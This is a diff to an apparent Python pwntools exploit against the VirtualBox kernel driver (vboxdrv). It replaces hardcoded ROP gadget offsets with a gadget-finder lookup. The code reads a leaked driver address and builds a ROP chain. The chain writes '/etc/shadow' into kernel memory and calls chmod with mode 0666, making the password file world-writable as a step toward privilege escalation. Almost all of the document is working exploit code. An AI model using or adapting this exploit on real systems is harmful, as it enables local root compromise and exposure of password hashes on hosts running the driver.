@@ -47,6 +47,7 @@ retq;                               VMMR0 + 0x01ea33
 '''
 import sys
 from pwn import *
+from unalignedrop.gadget_finder import gadget
 
 # For some insane reason (probably due to how ELF works) when we load the
 # target_binary into memory in userspace.c everything is 0x40 above where it
@@ -63,6 +64,11 @@ class Adjuster(object):
         Return the addr + the offset specified on creation
         '''
         return self.offset + addr
+
+    def add(self, add):
+        self.offset += add
+        return self.offset
+
 adjuster = Adjuster(0x00)
 
 def chmod_addr():
@@ -74,6 +80,7 @@ def leaked(start_leaker, search_for):
     # Get the address from the leak
     leaker = process(start_leaker)
     leak = ''
+    search_for = search_for.split('/')[-1]
     while not isinstance(leak, int):
         leak = leaker.recv().decode('utf-8').replace('\r', '')
         leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
@@ -92,10 +99,13 @@ def build(leak, gadget_file, sled_length):
     # Create the ROP stack
     rop = ROP(binary)
 
+    # Adjust found instructions
+    adjuster.add(leak)
+
     # Put a nice lil ret seld on der
     for i in range(0, sled_length):
         # ret;
-        rop.raw(adjuster(leak + 0x01ea33))
+        rop.raw(adjuster(gadget('ret;', gadget_file)))
 
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
@@ -103,55 +113,55 @@ def build(leak, gadget_file, sled_length):
     string_location = leak
 
     # pop rax; ret;
-    rop.raw(adjuster(leak + 0x01f7bd))
+    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
     # /etc
     rop.raw(b'/etc')
     # rop.raw(b'/tmp')
     # pop rdi; ret;
-    rop.raw(adjuster(leak + 0x07b62a))
+    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
     # set rdi
     rop.raw(adjuster(string_location))
     # mov rax, (rdi)
-    rop.raw(adjuster(leak + 0x081643))
+    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
 
     # pop rax; ret;
-    rop.raw(adjuster(leak + 0x01f7bd))
+    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
     # /sha
     rop.raw(b'/sha')
     # pop rdi; ret;
-    rop.raw(adjuster(leak + 0x07b62a))
+    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
     # set rdi
     rop.raw(adjuster(string_location + 4))
     # mov rax, (rdi)
-    rop.raw(adjuster(leak + 0x081643))
+    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
 
     # pop rax; ret;
-    rop.raw(adjuster(leak + 0x01f7bd))
+    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
     # dow\x00
     rop.raw(b'dow\x00')
     # pop rdi; ret;
-    rop.raw(adjuster(leak + 0x07b62a))
+    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
     # set rdi
     rop.raw(adjuster(string_location + 8))
     # mov rax, (rdi)
-    rop.raw(adjuster(leak + 0x081643))
+    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
 
     # Now call chmod
 
     # pop rax; ret;
-    rop.raw(adjuster(leak + 0x01f7bd))
+    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
     # set rax
     rop.raw(0x5a)
     # pop rdi; ret;
-    rop.raw(adjuster(leak + 0x07b62a))
+    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
     # set rdi
     rop.raw(adjuster(string_location))
     # pop rsi; ret;
-    rop.raw(adjuster(leak + 0x035058))
+    rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
     # set rsi
     rop.raw(0o666)
     # syscall; NULL
-    rop.raw(adjuster(leak + 0x012c384))
+    rop.raw(adjuster(gadget('syscall;', gadget_file)))
     # sys_chmod
     # rop.raw(adjuster(chmod_addr()))
 
